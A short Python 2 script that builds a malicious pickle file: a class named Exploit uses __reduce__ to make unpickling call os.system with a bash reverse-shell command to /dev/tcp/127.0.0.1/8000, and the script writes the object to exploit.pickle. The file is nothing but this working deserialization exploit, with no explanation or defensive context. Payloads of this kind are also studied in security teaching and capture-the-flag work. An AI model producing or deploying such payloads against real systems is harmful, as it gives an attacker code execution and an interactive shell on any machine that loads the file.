import cPickle
import os
import base64
import pickletools

class Exploit(object):
def __reduce__(self):
return (os.system, (("bash -i >& /dev/tcp/127.0.0.1/8000 0>&1"),))

with open("exploit.pickle", "wb") as f:
cPickle.dump(Exploit(), f, cPickle.HIGHEST_PROTOCOL)